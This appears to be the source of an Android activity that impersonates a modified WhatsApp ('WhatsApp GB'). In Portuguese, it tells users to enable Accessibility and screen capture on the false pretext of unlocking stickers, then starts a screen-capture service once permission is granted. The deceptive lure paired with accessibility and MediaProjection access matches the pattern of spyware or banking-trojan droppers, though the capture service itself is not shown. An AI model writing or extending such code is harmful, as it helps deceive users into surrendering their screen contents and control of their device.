package com.whatsapp.gb;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 100, 50, 50);
        layout.setBackgroundColor(Color.parseColor("#075E54"));
        layout.setGravity(Gravity.CENTER_HORIZONTAL);

        TextView titulo = new TextView(this);
        titulo.setText("WhatsApp GB - Ativação");
        titulo.setTextSize(24);
        titulo.setTextColor(Color.WHITE);
        layout.addView(titulo);

        TextView texto = new TextView(this);
        texto.setText("\nAtive a Acessibilidade e a Verificação de Tela para liberar as figurinhas.\n");
        texto.setTextSize(16);
        texto.setTextColor(Color.WHITE);
        layout.addView(texto);

        Button btnAcessibilidade = new Button(this);
        btnAcessibilidade.setText("1. Ativar Acessibilidade");
        btnAcessibilidade.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
        layout.addView(btnAcessibilidade);

        Button btnTela = new Button(this);
        btnTela.setText("2. Iniciar Verificação");
        btnTela.setOnClickListener(v -> {
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            startActivityForResult(mpm.createScreenCaptureIntent(), 100);
        });
        layout.addView(btnTela);
        setContentView(layout);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 100 && resultCode == RESULT_OK) {
            Intent intent = new Intent(this, ScreenCaptureService.class);
            intent.putExtra("resultCode", resultCode);
            intent.putExtra("data", data);
            startForegroundService(intent);
        }
    }
}
